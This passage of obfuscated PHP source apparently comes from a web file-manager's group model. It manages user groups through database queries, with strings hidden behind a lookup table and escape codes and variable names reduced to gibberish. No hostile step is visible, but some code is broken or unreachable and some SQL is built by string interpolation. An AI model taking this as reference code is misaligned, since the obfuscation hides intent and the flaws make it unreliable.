(!$ê¤¡ñÍË) { continue; } $ºÕÓøÆ‹ = is_array($ºÕÓøÆ‹) ? $ºÕÓøÆ‹ : array(); $ºÕÓøÆ‹ = array_merge($ºÕÓøÆ‹, $ê¤¡ñÍË); } return $ºÕÓøÆ‹; } public function delete($³¦ãËŸô = array()) { $•¹Ôë¢À =& $_SERVER[£ğ°ÖØø]; $¸Ôµíø¦ = self::SQL_WHERE_IN_CHUNK; $«ú¶Ü– = $this->optionsValue(); $õÄö©³Ù = $this->findWhereField($«ú¶Ü–); if (!$õÄö©³Ù) { return parent::delete($³¦ãËŸô); } $†½ÔÁº = 0; $ªñéô‹È = $«ú¶Ü–[$•¹Ôë¢À[352]][$õÄö©³Ù][1]; $ªñéô‹È = is_array($ªñéô‹È) ? $ªñéô‹È : array(); for ($óÕ¸’¾¯ = 0; $óÕ¸’¾¯ < count($ªñéô‹È); $óÕ¸’¾¯ += $¸Ôµíø¦) { $²ºĞÎ… = array_slice($ªñéô‹È, $óÕ¸’¾¯, $¸Ôµíø¦); if (!is_array($²ºĞÎ…) || count($²ºĞÎ…) == 0) { break; } $«ú¶Ü–[$•¹Ôë¢À[352]][$õÄö©³Ù][1] = $²ºĞÎ…; $this->optionsValue($«ú¶Ü–); $†½ÔÁº += parent::delete($³¦ãËŸô); } return $†½ÔÁº; } private function findWhereField($ãÎÍÖÂö) { $ô÷úÑùÈ =& $_SERVER[£ğ°ÖØø]; $òÆÛ‚±® = self::SQL_WHERE_IN_CHUNK; if (!is_array($ãÎÍÖÂö) || !is_array($ãÎÍÖÂö[$ô÷úÑùÈ[352]])) { return !1; } foreach ($ãÎÍÖÂö[$ô÷úÑùÈ[352]] as $¦ß†¡Ì† => $Ãº·òïí) { if (is_array($Ãº·òïí) && isset($Ãº·òïí[0]) && is_string($Ãº·òïí[0]) && strtolower($Ãº·òïí[0]) == $ô÷úÑùÈ[7] && is_array($Ãº·òïí[1]) && count($Ãº·òïí[1]) > $òÆÛ‚±®) { ignore_timeout(); return $¦ß†¡Ì†; } } return !1; } public function setMasterDB($–š£ë÷† = true) { think_config($_SERVER[£ğ°ÖØø][480], $–š£ë÷†); } } goto c¯šö¸×§Ü; cè¼¡†Ç†ø: class GroupModel extends ModelBase { protected $tableName = "\x67\162\x6f\165\160"; protected $tableMeta = array("\164\141\x62\x6c\x65\116\x61\x6d\x65" => "\147\x72\x6f\x75\x70\x5f\x6d\145\164\141", "\155\145\164\x61\x46\x69\x65\154\144" => "\x67\x72\157\165\160\x49\x44"); protected function cacheFunctionAlias($ÜŸ¾é’´) { $ÁºÜìî =& $_SERVER[£ğ°ÖØø]; return array($ÁºÜìî[2036] => array($ÜŸ¾é’´[0], $ÁºÜìî[2037]), $ÁºÜìî[2038] => array($ÜŸ¾é’´[0], $ÁºÜìî[2039])); } protected function getInfo($”¿¹ßÍ, $Ê¥ôùäô = false) { $¾Õ÷¤ç’ = $this->getInfoSimple($”¿¹ßÍ); if (!$¾Õ÷¤ç’) { return !1; } if ($Ê¥ôùäô) { return $this->_listDataApplyItem($¾Õ÷¤ç’); } return $this->cacheFunctionGet($_SERVER[£ğ°ÖØø][2040], $”¿¹ßÍ); } protected function getInfoSimple($À´ßÁ§¤, $¸©äøâì = false) { $“àÂâä¨ =& $_SERVER[£ğ°ÖØø]; if ($¸©äøâì) { $¿Ø÷â‚À = array($“àÂâä¨[1954] => intval($À´ßÁ§¤)); $îæˆüç… = $this->where($¿Ø÷â‚À)->find(); return is_array($îæˆüç…) ? $îæˆüç… : array(); } return $this->cacheFunctionGet($“àÂâä¨[2041], $À´ßÁ§¤); } protected function groupAdd($Ü‚¦Ç“) { $Ò¨şÊ™È =& $_SERVER[£ğ°ÖØø]; if (!$Ü‚¦Ç“[$Ò¨şÊ™È[192]] && isset($Ü‚¦Ç“[$Ò¨şÊ™È[1954]]) && $Ü‚¦Ç“[$Ò¨şÊ™È[1954]] == 1) { if ($ıÀûàªÕ = $this->getInfoSimple($Ü‚¦Ç“[$Ò¨şÊ™È[1954]], !0)) { return $Ü‚¦Ç“[$Ò¨şÊ™È[1954]]; } } else { $ıÀûàªÕ = $this->getInfoSimple($Ü‚¦Ç“[$Ò¨şÊ™È[192]]); if (!$ıÀûàªÕ) { return !1; } } $Ë©ª§õ = $Ò¨şÊ™È[603]; if ($ıÀûàªÕ[$Ò¨şÊ™È[593]]) { $Ë©ª§õ = $ıÀûàªÕ[$Ò¨şÊ™È[593]] . $ıÀûàªÕ[$Ò¨şÊ™È[1954]] . $Ò¨şÊ™È[50]; } $ÅŒ¿½ƒ = array($Ò¨şÊ™È[503] => $this->groupNameAuto($Ü‚¦Ç“[$Ò¨şÊ™È[192]], $Ü‚¦Ç“[$Ò¨şÊ™È[32]]), $Ò¨şÊ™È[486] => $Ü‚¦Ç“[$Ò¨şÊ™È[192]], $Ò¨şÊ™È[661] => $Ë©ª§õ, $Ò¨şÊ™È[2042] => $Ü‚¦Ç“[$Ò¨şÊ™È[1940]], $Ò¨şÊ™È[2043] => 0, $Ò¨şÊ™È[1958] => 0); if (isset($Ü‚¦Ç“[$Ò¨şÊ™È[1978]])) { $ÅŒ¿½ƒ[$Ò¨şÊ™È[1978]] = $Ü‚¦Ç“[$Ò¨şÊ™È[1978]]; } else { $¦Üü›‚ˆ = $this->max($Ò¨şÊ™È[1978]); if (!$¦Üü›‚ˆ) { $¦Üü›‚ˆ = 0; } $ÅŒ¿½ƒ[$Ò¨şÊ™È[1978]] = $¦Üü›‚ˆ + 1; } if (!empty($Ü‚¦Ç“[$Ò¨şÊ™È[1954]])) { $ÅŒ¿½ƒ[$Ò¨şÊ™È[1954]] = $Ü‚¦Ç“[$Ò¨şÊ™È[1954]]; } $ğûå£Ê³ = $this->add($ÅŒ¿½ƒ); $this->setNamePinyin($ğûå£Ê³, $ÅŒ¿½ƒ[$Ò¨şÊ™È[32]]); if (isset($Ü‚¦Ç“[$Ò¨şÊ™È[2044]])) { $this->metaSet($ğûå£Ê³, array($Ò¨şÊ™È[2044] => $Ü‚¦Ç“[$Ò¨şÊ™È[2044]], $Ò¨şÊ™È[2045] => $Ü‚¦Ç“[$Ò¨şÊ™È[2045]])); unset($Ü‚¦Ç“[$Ò¨şÊ™È[2044]]); unset($Ü‚¦Ç“[$Ò¨şÊ™È[2045]]); } Model($Ò¨şÊ™È[1401])->groupRootAdd($ğûå£Ê³); $this->_clearCache($Ü‚¦Ç“[$Ò¨şÊ™È[192]]); return $ğûå£Ê³; } protected function groupEdit($’²ØÃŞ®, $ğ×„Ó¥·) { $£İ¥Çô¾ =& $_SERVER[£ğ°ÖØø]; $ööè›ªÛ = $this->getInfoSimple($’²ØÃŞ®); if (!$ööè›ªÛ) { return !1; } if (!empty($ğ×„Ó¥·[$£İ¥Çô¾[192]])) { $ëª·îô­ = $this->getInfoSimple($ğ×„Ó¥·[$£İ¥Çô¾[192]]); if (!$ëª·îô­) { return !1; } if ($ööè›ªÛ[$£İ¥Çô¾[1954]] == $ëª·îô­[$£İ¥Çô¾[1954]]) { return !1; } if ($ğ×„Ó¥·[$£İ¥Çô¾[192]] != $ööè›ªÛ[$£İ¥Çô¾[192]]) { if ($ëª·îô­[$£İ¥Çô¾[593]] !== $ööè›ªÛ[$£İ¥Çô¾[593]] && strpos($ëª·îô­[$£İ¥Çô¾[593]], $ööè›ªÛ[$£İ¥Çô¾[593]] . $ööè›ªÛ[$£İ¥Çô¾[1954]] . $£İ¥Çô¾[50]) === 0) { return !1; } $ğ×„Ó¥·[$£İ¥Çô¾[661]] = $ëª·îô­[$£İ¥Çô¾[593]] . $ğ×„Ó¥·[$£İ¥Çô¾[192]] . $£İ¥Çô¾[50]; $this->_changeChildLevel($ööè›ªÛ, $ëª·îô­); $this->_clearCache($ëª·îô­[$£İ¥Çô¾[1954]]); $this->_clearCache($ööè›ªÛ[$£İ¥Çô¾[192]]); } } if (isset($ğ×„Ó¥·[$£İ¥Çô¾[32]])) { $this->setNamePinyin($’²ØÃŞ®, $ğ×„Ó¥·[$£İ¥Çô¾[32]]); } if (isset($ğ×„Ó¥·[$£İ¥Çô¾[2044]])) { $this->metaSet($’²ØÃŞ®, array($£İ¥Çô¾[2044] => $ğ×„Ó¥·[$£İ¥Çô¾[2044]], $£İ¥Çô¾[2045] => $ğ×„Ó¥·[$£İ¥Çô¾[2045]])); unset($ğ×„Ó¥·[$£İ¥Çô¾[2044]]); unset($ğ×„Ó¥·[$£İ¥Çô¾[2045]]); } $this->_clearChildrenCache($ööè›ªÛ); return $this->where(array($£İ¥Çô¾[2046] => $’²ØÃŞ®))->save($ğ×„Ó¥·); } private function _clearChildrenCache($×œ¬ÎÜÔ) { $¢â‡Î„¾ =& $_SERVER[£ğ°ÖØø]; $ˆÓ¯â‰Õ = array($¢â‡Î„¾[661] => array($¢â‡Î„¾[621], $×œ¬ÎÜÔ[$¢â‡Î„¾[593]] . $×œ¬ÎÜÔ[$¢â‡Î„¾[1954]] . $¢â‡Î„¾[622])); $†ĞõŸÃÓ = $this->field($¢â‡Î„¾[1954])->where($ˆÓ¯â‰Õ)->select(); foreach ($†ĞõŸÃÓ as $Ä²Ì€ÚÛ) { $this->_clearCache($Ä²Ì€ÚÛ[$¢â‡Î„¾[1954]]); } } private function _clearCache($¤Äå¬û) { $»–É•» =& $_SERVER[£ğ°ÖØø]; $this->cacheFunctionClear($»–É•»[2040], $¤Äå¬û); $this->cacheFunctionClear($»–É•»[2041], $¤Äå¬û); } private function _changeChildLevel($òì·¢‰Á, $ ½¥ÕÊ÷, $¯Ñ’´• = false) { $»¨¸Ğï =& $_SERVER[£ğ°ÖØø]; $’¸¡úÚ = $òì·¢‰Á[$»¨¸Ğï[593]] . $òì·¢‰Á[$»¨¸Ğï[1954]] . $»¨¸Ğï[50]; $»•³Ê†Û = $ ½¥ÕÊ÷[$»¨¸Ğï[593]] . $ ½¥ÕÊ÷[$»¨¸Ğï[1954]] . $»¨¸Ğï[50] . $òì·¢‰Á[$»¨¸Ğï[1954]] . $»¨¸Ğï[50]; if ($¯Ñ’´•) { $»•³Ê†Û = $ ½¥ÕÊ÷[$»¨¸Ğï[593]] . $ ½¥ÕÊ÷[$»¨¸Ğï[1954]] . $»¨¸Ğï[50]; } $¤ë×½ğÇ = array($»¨¸Ğï[661] => array($»¨¸Ğï[621], $òì·¢‰Á[$»¨¸Ğï[593]] . $òì·¢‰Á[$»¨¸Ğï[1954]] . $»¨¸Ğï[622])); $ÓóÇšÙİ = array($»¨¸Ğï[661] => array($»¨¸Ğï[670], "\x72\x65\x70\x6c\141\x63\x65\x28\x70\141\162\x65\x6e\x74\x4c\x65\x76\145\154\54\x27{$’¸¡úÚ}\47\54\47{$»•³Ê†Û}\47\x29")); $this->_clearChildrenCache($òì·¢‰Á); $this->where($¤ë×½ğÇ)->data($ÓóÇšÙİ)->save(); } public function setNamePinyin($Í—Ú²Ü×, $›×È˜ğï = false) { $çãÚ×ˆş =& $_SERVER[£ğ°ÖØø]; if (!$›×È˜ğï) { $€ü»Å¿• = $this->getInfoSimple($Í—Ú²Ü×); $›×È˜ğï = $€ü»Å¿•[$çãÚ×ˆş[32]]; } if (!Input::check($›×È˜ğï, $çãÚ×ˆş[664])) { $this->metaSet($Í—Ú²Ü×, $çãÚ×ˆş[547], null); $this->metaSet($Í—Ú²Ü×, $çãÚ×ˆş[546], null); return; } $–ŠáÊ›Š = array($çãÚ×ˆş[547] => str_replace($çãÚ×ˆş[53], $çãÚ×ˆş[12], Pinyin::get($›×È˜ğï)), $çãÚ×ˆş[546] => Pinyin::get($›×È˜ğï, $çãÚ×ˆş[665])); $this->metaSet($Í—Ú²Ü×, $–ŠáÊ›Š); } protected function groupStatus($Öı²úœ“, $£Âô¹Êş) { $ÄØèà—î =& $_SERVER[£ğ°ÖØø]; $šóÆÖ” = $this->getInfoSimple($Öı²úœ“); if (!$šóÆÖ”) { return !1; } $this->_clearCache($Öı²úœ“); return $this->metaSet($Öı²úœ“, $ÄØèà—î[814], $£Âô¹Êş); if ($£Âô¹Êş == $ÄØèà—î[91]) { $¸‹úäÊ = $this->parentLevelArray($šóÆÖ”[$ÄØèà—î[593]]); } else { } $¸‹úäÊ[] = $šóÆÖ”[$ÄØèà—î[1954]]; $“êµ»Ê = array(); foreach ($¸‹úäÊ as $Öı²úœ“) { $“êµ»Ê[] = array($ÄØèà—î[1954] => $Öı²úœ“, $ÄØèà—î[97] => $ÄØèà—î[814], $ÄØèà—î[459] => $£Âô¹Êş); $this->_clearCache($Öı²úœ“); } return Model($ÄØèà—î[2047])->addAll($“êµ»Ê, array(), !0); } protected function groupRemove($¶Œ²Œó½, $î°š±® = false) { $ŠşÅ©æ =& $_SERVER[£ğ°ÖØø]; $Ğ»ûòÙù = array($ŠşÅ©æ[1954] => $¶Œ²Œó½); $È…Ã»Å = $this->where($Ğ»ûòÙù)->find(); if (!$È…Ã»Å || $È…Ã»Å[$ŠşÅ©æ[192]] == 0) { return !1; } if (!$î°š±®) { $èõáû = $this->getInfoSimple($È…Ã»Å[$ŠşÅ©æ[192]]); $this->_changeChildLevel($È…Ã»Å, $èõáû, !0); $this->where(array($ŠşÅ©æ[192] => $¶Œ²Œó½))->save(array($ŠşÅ©æ[192] => $È…Ã»Å[$ŠşÅ©æ[192]])); $this->_clearCache($èõáû[$ŠşÅ©æ[1954]]); } Model($ŠşÅ©æ[2047])->where($Ğ»ûòÙù)->delete(); Model($ŠşÅ©æ[2048])->where($Ğ»ûòÙù)->delete(); Model($ŠşÅ©æ[888])->groupRootRemove($¶Œ²Œó½); $this->_clearCache($È…Ã»Å[$ŠşÅ©æ[192]]); return $this->where($Ğ»ûòÙù)->delete(); } protected function groupSort($“š¡É¦Â) { $Ğõ´ƒªã =& $_SERVER[£ğ°ÖØø]; $œÙÎó€ = array(); foreach ($“š¡É¦Â as $‚õÉŠÍ­ => $©¢¥ûæò) { $œÙÎó€[] = array($Ğõ´ƒªã[1954], $©¢¥ûæò, $Ğõ´ƒªã[1978], $‚õÉŠÍ­ + 1); } $this->saveAll($œÙÎó€); } public function listData() { $Ÿ³ò™Ó¥ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ÿ³ò™Ó¥[$_SERVER[£ğ°ÖØø][454]]); return $Ÿ³ò™Ó¥; } private function _makeOrder($‘ŠÍ¯„° = '') { $¸£²ÓÉÊ =& $_SERVER[£ğ°ÖØø]; $ıı¹¿‘³ = array($¸£²ÓÉÊ[1954], $¸£²ÓÉÊ[32], $¸£²ÓÉÊ[1942], $¸£²ÓÉÊ[231]); $¼¶¦Ì³û = array($¸£²ÓÉÊ[532] => $¸£²ÓÉÊ[533], $¸£²ÓÉÊ[534] => $¸£²ÓÉÊ[535]); $Ìíø–äÇ = Input::get($¸£²ÓÉÊ[539], $¸£²ÓÉÊ[7], $¸£²ÓÉÊ[1958], $ıı¹¿‘³); $¸ñû»¶“ = Input::get($¸£²ÓÉÊ[540], $¸£²ÓÉÊ[7], $¸£²ÓÉÊ[2049], array($¸£²ÓÉÊ[2049], $¸£²ÓÉÊ[534])); $¸ñû»¶“ = $¼¶¦Ì³û[$¸ñû»¶“]; $‘ŠÍ¯„° = $‘ŠÍ¯„° . "{$Ìíø–äÇ}\40{$¸ñû»¶“}\x2c\40\x67\x72\x6f\x75\x70\x49\x44\x20\141\x73\143"; return $this->order($‘ŠÍ¯„°); } public function listChild($æç³«€Ÿ) { $¨­¶×Ğ =& $_SERVER[£ğ°ÖØø]; $¶ù½ÂÔÆ = $this->where(array($¨­¶×Ğ[192] => $æç³«€Ÿ))->_makeOrder()->selectPage(200); $this->_listDataApply($¶ù½ÂÔÆ[$¨­¶×Ğ[454]]); return $¶ù½ÂÔÆ; } public function listChildIds($í“øçâ) { $¥ÜùëÃ =& $_SERVER[£ğ°ÖØø]; if (is_string($óÀÓÈÌÂ)) { $í“øçâ = explode($¥ÜùëÃ[50], $í“øçâ); } $¦‡Çùªí = $this->where(array($¥ÜùëÃ[1954] => array($¥ÜùëÃ[7], $í“øçâ)))->field($¥ÜùëÃ[2050])->select(); if (!$¦‡Çùªí) { return !1; } $é•ÏíÄÅ = array(); foreach ($¦‡Çùªí as $™¥üæÄ) { $é•ÏíÄÅ[] = "\163\x65\x6c\x65\143\x74\x20\147\x72\157\x75\160\x49\104\40\x66\162\x6f\155\x20\x60\147\x72\x6f\165\160\140\x20\167\150\x65\162\x65\x20\x70\141\162\145\x6e\x74\114\x65\166\x65\x6c\x20\x6c\x69\153\x65\x20\x27{$™¥üæÄ[$¥ÜùëÃ[593]]}{$™¥üæÄ[$¥ÜùëÃ[1954]]}\x2c\x25\47"; } $é•ÏíÄÅ = implode($¥ÜùëÃ[2051], $é•ÏíÄÅ); $¦‡Çùªí = $this->query($é•ÏíÄÅ); if (!$¦‡Çùªí) { return array(); } $í“øçâ = array_to_keyvalue($¦‡Çùªí, $¥ÜùëÃ[12], $¥ÜùëÃ[1954]); return array_unique($í“øçâ); } public function listByID($˜şè¢¹ü) { $±ôş¹“ =& $_SERVER[£ğ°ÖØø]; if (!$˜şè¢¹ü) { return array(); } $Á»üÕçş = array($±ôş¹“[1954] => array($±ôş¹“[7], $˜şè¢¹ü)); $¬²ø„…ˆ = $this->where($Á»üÕçş)->select(); $¬²ø„…ˆ = array_sort_keep($¬²ø„…ˆ, $±ôş¹“[1954], $˜şè¢¹ü); $this->_listDataApply($¬²ø„…ˆ); return $¬²ø„…ˆ; } public function listSearch($õÁûúïò) { $±ˆ™ÚØ =& $_SERVER[£ğ°ÖØø]; $“¿²Åë® = trim($õÁûúïò[$±ˆ™ÚØ[2052]]); $ìÕÆí°á = explode($±ˆ™ÚØ[53], $“¿²Åë®); if (!$“¿²Åë® || count($ìÕÆí°á) == 1) { return $this->listSearchNow($õÁûúïò); } $ÀÓ»õı = array($±ˆ™ÚØ[454] => array()); foreach ($ìÕÆí°á as $°÷ÄØ¶Ò) { if (!trim($°÷ÄØ¶Ò)) { continue; } $õÁûúïò[$±ˆ™ÚØ[2052]] = $°÷ÄØ¶Ò; $³ü·‚¦° = $this->listSearchNow($õÁûúïò); $ÀÓ»õı[$±ˆ™ÚØ[454]] = array_merge($ÀÓ»õı[$±ˆ™ÚØ[454]], $³ü·‚¦°[$±ˆ™ÚØ[454]]); } $ÀÓ»õı[$±ˆ™ÚØ[454]] = array_unique_by_key($ÀÓ»õı[$±ˆ™ÚØ[454]], $±ˆ™ÚØ[1954]); $ÀÓ»õı[$±ˆ™ÚØ[451]] = array($±ˆ™ÚØ[452] => count($ÀÓ»õı[$±ˆ™ÚØ[454]]), $±ˆ™ÚØ[448] => 20, $±ˆ™ÚØ[429] => 1, $±ˆ™ÚØ[453] => 1); return $ÀÓ»õı; } public function listSearchNow($æÈÌÇ¼˜) { $ùŒŞòÔŸ =& $_SERVER[£ğ°ÖØø]; $œ•Ì×–Š = trim($æÈÌÇ¼˜[$ùŒŞòÔŸ[2052]]); $Î˜³Öö = isset($æÈÌÇ¼˜[$ùŒŞòÔŸ[2053]]) ? $æÈÌÇ¼˜[$ùŒŞòÔŸ[2053]] : !1; if (!trim($œ•Ì×–Š)) { return !1; } $œ•Ì×–Š = str_replace($ùŒŞòÔŸ[2054], $ùŒŞòÔŸ[2055], $œ•Ì×–Š); $ï•¡¬¨ş = array($ùŒŞòÔŸ[1954] => array($ùŒŞòÔŸ[468], "{$œ•Ì×–Š}\45"), $ùŒŞòÔŸ[32] => array($ùŒŞòÔŸ[468], "\45{$œ•Ì×–Š}\x25"), $ùŒŞòÔŸ[1061] => $ùŒŞòÔŸ[2056]); if ($Î˜³Öö) { $È¯´üñ = $this->getInfoSimple($Î˜³Öö); $¾¿ïÍ›ï = $È¯´üñ[$ùŒŞòÔŸ[593]] . $Î˜³Öö . $ùŒŞòÔŸ[622]; $ï•¡¬¨ş = array($ï•¡¬¨ş, array($ùŒŞòÔŸ[593] => array($ùŒŞòÔŸ[468], $¾¿ïÍ›ï))); } $ï•¡¬¨ş = $this->parseWhereLike($ï•¡¬¨ş); $Ü–•ÖÅÅ = $this->_makeOrder()->where($ï•¡¬¨ş)->selectPage(20); $Ü–•ÖÅÅ = $Ü–•ÖÅÅ ? $Ü–•ÖÅÅ : array($ùŒŞòÔŸ[454] => array(), $ùŒŞòÔŸ[451] => array()); if (!$Ü–•ÖÅÅ || count($Ü–•ÖÅÅ[$ùŒŞòÔŸ[454]]) < 5 && Input::check($œ•Ì×–Š, $ùŒŞòÔŸ[394])) { $¡á˜±¬Ğ = $this->groupChildrenAll($Î˜³Öö); $Ï­«“ıà = $this->_searchFromMeta($ùŒŞòÔŸ[546], $œ•Ì×–Š, 10, $¡á˜±¬Ğ); $ô·õà¦ = $this->_searchFromMeta($ùŒŞòÔŸ[547], $œ•Ì×–Š, 10, $¡á˜±¬Ğ); $Ğ½öœÚ = array_merge($Ï­«“ıà, $ô·õà¦, $Ü–•ÖÅÅ[$ùŒŞòÔŸ[454]]); $Ü–•ÖÅÅ[$ùŒŞòÔŸ[454]] = array_unique_by_key($Ğ½öœÚ, $ùŒŞòÔŸ[1954]); $Ü–•ÖÅÅ[$ùŒŞòÔŸ[451]][$ùŒŞòÔŸ[452]] = count($Ü–•ÖÅÅ[$ùŒŞòÔŸ[454]]); $Ü–•ÖÅÅ[$ùŒŞòÔŸ[451]][$ùŒŞòÔŸ[453]] = ceil($Ü–•ÖÅÅ[$ùŒŞòÔŸ[451]][$ùŒŞòÔŸ[452]] / $Ü–•ÖÅÅ[$ùŒŞòÔŸ[451]][$ùŒŞòÔŸ[448]]); } $this->_listDataApply($Ü–•ÖÅÅ[$ùŒŞòÔŸ[454]]); return $Ü–•ÖÅÅ; } protected function groupChildrenAll($Ç˜æ¢¥ä) { $©È˜³’Æ =& $_SERVER[£ğ°ÖØø]; if (!$Ç˜æ¢¥ä) { return !1; } if (!is_array($Ç˜æ¢¥ä)) { $Ç˜æ¢¥ä = array($Ç˜æ¢¥ä); } $Ï«·ÕŒ = $Ç˜æ¢¥ä; foreach ($Ç˜æ¢¥ä as $„æãØ×) { $°…Û£ĞÊ = $this->getInfoSimple($„æãØ×); $ª‹«şú = array($©È˜³’Æ[593] => array($©È˜³’Æ[468], $°…Û£ĞÊ[$©È˜³’Æ[593]] . $„æãØ× . $©È˜³’Æ[622])); $´¾Û…óÊ = $this->field($©È˜³’Æ[1954])->where($ª‹«şú)->select(); $Ï«·ÕŒ = array_merge($Ï«·ÕŒ, array_to_keyvalue($´¾Û…óÊ, $©È˜³’Æ[12], $©È˜³’Æ[1954])); } return array_unique($Ï«·ÕŒ); } private function _searchFromMeta($ùÃ¿Î©, $üÃíİòâ, $Ç¦şŠŸÜ, $‘ä²àÏ) { $ÒØÊß¢ =& $_SERVER[£ğ°ÖØø]; $üÃíİòâ = strtolower($üÃíİòâ); $ŒÉòòŒõ = array($ÒØÊß¢[97] => $ùÃ¿Î©, $ÒØÊß¢[459] => array($ÒØÊß¢[468], "\x25{$üÃíİòâ}\45")); $ŒÉòòŒõ = $this->parseWhereLike($ŒÉòòŒõ); if ($‘ä²àÏ) { $ŒÉòòŒõ[$ÒØÊß¢[1954]] = array($ÒØÊß¢[7], $‘ä²àÏ); } $ŠÓ«è“ = Model($ÒØÊß¢[2057])->where($ŒÉòòŒõ)->limit($Ç¦şŠŸÜ)->select(); if (!$ŠÓ«è“) { return array(); } $ŠÓ«è“ = array_to_keyvalue($ŠÓ«è“, $ÒØÊß¢[12], $ÒØÊß¢[1954]); $ıåéşŞ¬ = $this->where(array($ÒØÊß¢[2046] => array($ÒØÊß¢[7], $ŠÓ«è“)))->select(); if (!$ıåéşŞ¬) { return array(); } return $ıåéşŞ¬; } protected function _listDataApplyItem($‡‘Ò¬Ä“) { $‹Ğ¨Å™ì = array($‡‘Ò¬Ä“); $this->_listDataApply($‹Ğ¨Å™ì); return $‹Ğ¨Å™ì[0]; } protected function _listDataApply(&$ı†ÕÀÃÃ) { $€ğ›öÔ§ =& $_SERVER[£ğ°ÖØø]; if (!$ı†ÕÀÃÃ) { return; } $çüˆÍŞ“ = array_to_keyvalue($ı†ÕÀÃÃ, $€ğ›öÔ§[12], $€ğ›öÔ§[1954]); $this->_listAppendChildren($ı†ÕÀÃÃ); $this->_listAppendChildrenMember($ı†ÕÀÃÃ); $this->_listAppendMeta($ı†ÕÀÃÃ, $çüˆÍŞ“); $this->_listAppendParent($ı†ÕÀÃÃ); $this->_listAppendSourceRoot($ı†ÕÀÃÃ, $çüˆÍŞ“); } private function _listAppendChildren(&$‘ÛÎ’Â©) { $Á°Í¿£É =& $_SERVER[£ğ°ÖØø]; $…ùÊ¢Šš = array_to_keyvalue($‘ÛÎ’Â©, $Á°Í¿£É[12], $Á°Í¿£É[1954]); $‡ƒñÛ¬ = array($Á°Í¿£É[192] => array($Á°Í¿£É[7], $…ùÊ¢Šš)); $ûëÅË¼µ = array($Á°Í¿£É[192], $Á°Í¿£É[2058] => $Á°Í¿£É[574]); $‡ÒáïÊ = $this->field($ûëÅË¼µ)->where($‡ƒñÛ¬)->group($Á°Í¿£É[192])->select(); $ÎÀ’»êÛ = array_to_keyvalue($‡ÒáïÊ, $Á°Í¿£É[192], $Á°Í¿£É[574]); foreach ($‘ÛÎ’Â© as &$íò´Šœ®) { $”ÙøÍ—è = $íò´Šœ®[$Á°Í¿£É[1954]]; $íò´Šœ®[$Á°Í¿£É[2059]] = isset($ÎÀ’»êÛ[$”ÙøÍ—è]) ? intval($ÎÀ’»êÛ[$”ÙøÍ—è]) : !1; } unset($íò´Šœ®); } private function _listAppendChildrenMember(&$öí¦¯Û) { $¯•Ñ¯Ê• =& $_SERVER[£ğ°ÖØø]; $®³øÀœÙ = array_to_keyvalue($öí¦¯Û, $¯•Ñ¯Ê•[12], $¯•Ñ¯Ê•[1954]); $üšœïé = array($¯•Ñ¯Ê•[1954] => array($¯•Ñ¯Ê•[7], $®³øÀœÙ)); $ƒİ—ş¥ß = array($¯•Ñ¯Ê•[1954], $¯•Ñ¯Ê•[2058] => $¯•Ñ¯Ê•[574]); $˜Î·¤¢À = Model($¯•Ñ¯Ê•[2048])->field($ƒİ—ş¥ß)->where($üšœïé)->group($¯•Ñ¯Ê•[1954])->select(); $ó¨‚´Øè = array_to_keyvalue($˜Î·¤¢À, $¯•Ñ¯Ê•[1954], $¯•Ñ¯Ê•[574]); foreach ($öí¦¯Û as &$²–‚‘†ë) { $´³è„Ø = $²–‚‘†ë[$¯•Ñ¯Ê•[1954]]; $²–‚‘†ë[$¯•Ñ¯Ê•[2060]] = isset($ó¨‚´Øè[$´³è„Ø]) ? intval($ó¨‚´Øè[$´³è„Ø]) : !1; } unset($²–‚‘†ë); } private function _listAppendMeta(&$¾–œ¸¦, $”½ôØ¬“) { $Ú‚ÈÀğÕ =& $_SERVER[£ğ°ÖØø]; $ñÏÅÑş = array($Ú‚ÈÀğÕ[1954] => array($Ú‚ÈÀğÕ[7], $”½ôØ¬“)); $òî½èãĞ = Model($Ú‚ÈÀğÕ[2047])->where($ñÏÅÑş)->select(); $òî½èãĞ = array_to_keyvalue_group($òî½èãĞ, $Ú‚ÈÀğÕ[1954]); foreach ($òî½èãĞ as &$•ñ˜Õøî) { $•ñ˜Õøî = array_to_keyvalue($•ñ˜Õøî, $Ú‚ÈÀğÕ[97], $Ú‚ÈÀğÕ[459]); } unset($•ñ˜Õøî); foreach ($¾–œ¸¦ as &$àÎª) { $àÎª[$Ú‚ÈÀğÕ[548]] = array(); if (isset($òî½èãĞ[$àÎª[$Ú‚ÈÀğÕ[1954]]])) { $àÎª[$Ú‚ÈÀğÕ[548]] = $òî½èãĞ[$àÎª[$Ú‚ÈÀğÕ[1954]]]; } } unset($àÎª); } protected function parentLevelArray($ëª‰”ã) { $…ëİ“àü =& $_SERVER[£ğ°ÖØø]; $ëª‰”ã = explode($…ëİ“àü[50], trim($ëª‰”ã, $…ëİ“àü[50])); $ëª‰”ã = array_remove_value($ëª‰”ã, $…ëİ“àü[228]); return $ëª‰”ã; } protected function parentInGroup($øÜÓääæ, $ê²¤–ô€) { $†Çµ‚™é =& $_SERVER[£ğ°ÖØø]; $˜Ã³µ¹È = $this->getInfoSimple($øÜÓääæ); if (!$˜Ã³µ¹È) { return !0; } $Ì«¥¼„ç = $this->parentLevelArray($˜Ã³µ¹È[$†Çµ‚™é[593]]); $Ì«¥¼„ç[] = $øÜÓääæ; foreach ($Ì«¥¼„ç as $øÜÓääæ) { if (in_array($øÜÓääæ . $†Çµ‚™é[12], $ê²¤–ô€)) { return !0; } } return !1; } private function _listAppendParent(&$‰ğÁ©©ƒ) { $®¢×®Î¦ =& $_SERVER[£ğ°ÖØø]; $øœéĞıÂ = array(); foreach ($‰ğÁ©©ƒ as &$¼ºİ„ï¿) { $øœéĞıÂ[$¼ºİ„ï¿[$®¢×®Î¦[1954]]] = $¼ºİ„ï¿[$®¢×®Î¦[32]]; $„ßë›¹ = $this->parentLevelArray($¼ºİ„ï¿[$®¢×®Î¦[593]]); foreach ($„ßë›¹ as $û¬®×÷Õ) { if (!isset($øœéĞıÂ[$û¬®×÷Õ])) { $øœéĞıÂ[$û¬®×÷Õ] = 0; } } } unset($¼ºİ„ï¿); foreach ($øœéĞıÂ as $“ŞüŠÈ¹ => $§ßÇèÊÎ) { if ($§ßÇèÊÎ) { continue; } $ßÓİ¼ãÛ = $this->getInfoSimple($“ŞüŠÈ¹); $øœéĞıÂ[$“ŞüŠÈ¹] = $ßÓİ¼ãÛ[$®¢×®Î¦[32]]; } $ì×üíúÔ = $GLOBALS[$®¢×®Î¦[6]][$®¢×®Î¦[92]][$®¢×®Î¦[2061]]; if (KodUser::isRoot()) { $ì×üíúÔ = !1; } foreach ($‰ğÁ©©ƒ as &$¼ºİ„ï¿) { 